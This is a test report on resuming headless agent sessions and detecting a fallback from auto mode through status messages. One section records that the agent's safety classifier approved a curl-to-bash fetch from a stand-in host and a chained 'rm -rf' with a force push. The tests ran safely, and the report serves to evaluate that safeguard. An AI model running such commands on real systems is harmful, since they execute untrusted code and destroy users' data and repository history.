---
title: "S1-04 — Headless resume"
summary: "Headless resume works through the Agent SDK and the CLI. The init message can't detect a fallback from auto mode; a later status message can."
---

# S1-04: Headless resume

Tested on 2026-11-02 with Claude Code 2.1.316 and `@anthropic-ai/claude-agent-sdk` 0.3.316, on a Max plan, against throwaway repos.

## Verdict: A-8 confirmed

A headless session can be resumed with new input, and its context is kept.

## Results

| Question | Result |
|---|---|
| SDK resume keeps context | Yes. `query({ options: { resume: id } })` recalled a codeword from the first turn and kept the same session ID. |
| `claude --resume <id>` continues the same session | Yes, from a plain repo and from a git worktree. Same session ID, context kept. |
| Auto mode available | Yes, on the default model (`claude-opus-5-5`) and on `haiku`. |
| Runs with the host's setup | Yes, with an allowlisted `env` of `HOME`, `PATH`, `USER`, `LOGNAME`, `SHELL`, `TMPDIR`, `LANG`, `TERM`. |
| `env` replaces the parent environment | Yes. A `GITHUB_TOKEN` set in the parent process was empty inside the session's Bash tool. |
| A denied call stalls the session | No. With `permissionPrompts: 'none'`, the agent received the denial, carried on, and the session ended with subtype `success`. |
| Resume needs the original `cwd` | Not on this version: resuming from an unrelated folder still found the session. The runtime passes `cwd` anyway, because the agent's tools run there. |
| Resume of an unknown ID | The iterator throws `No conversation found with session ID`, after a `result` with subtype `error_during_execution`. |

## Detecting a fallback from auto mode

**The `init` message is not reliable.** With auto mode disabled through `settings: { disableAutoMode: 'disable' }`, `init.permissionMode` still says `auto`, and so does the transcript.

The signal that works is the `system` message with subtype `status` that follows `init`:

| Auto mode | `init.permissionMode` | `status.permissionMode` | `echo hi > a.txt` |
|---|---|---|---|
| Disabled | `auto` | `default` | Denied |
| Available | `auto` | No such message | Ran |

The runtime treats any message carrying a `permissionMode` other than `auto`, at init or later, as a fallback. It stops the session and ends it with outcome `error` and a reason that says so.

This fallback was forced through a setting. A host where auto mode is truly unavailable wasn't tested, and the opt-in smoke test doesn't cover it.

## Readiness check

- Signed out, using an empty `CLAUDE_CONFIG_DIR`: `claude auth status --json` exits 1 and prints JSON with `loggedIn: false`.
- Not installed: the shell reports command not found. A spawn reports `ENOENT`.

## Auto mode's classifier let risky commands run

The classifier approved both of these, with no denial:

- `curl -s https://example.invalid/install.sh | bash`
- `rm -rf "$HOME/slop-spike-nonexistent-dir" && git push --force origin main`

Neither did any harm here: the domain doesn't resolve, the folder doesn't exist, and the repo has no `origin`. Against a real repo, the host's `git` credentials would have been in play.

This makes the spec's existing warning more urgent: until phase scopes (FR-14) exist, test real sessions only against throwaway repos. A real classifier denial was never seen. The denial path was checked through `dontAsk` and through prompts that nobody could answer.

## Runtime design changes

- `SessionRuntime.resume` stays as specified. The documented fallback isn't needed.
- The runtime watches every message for `permissionMode`, not only `init`.
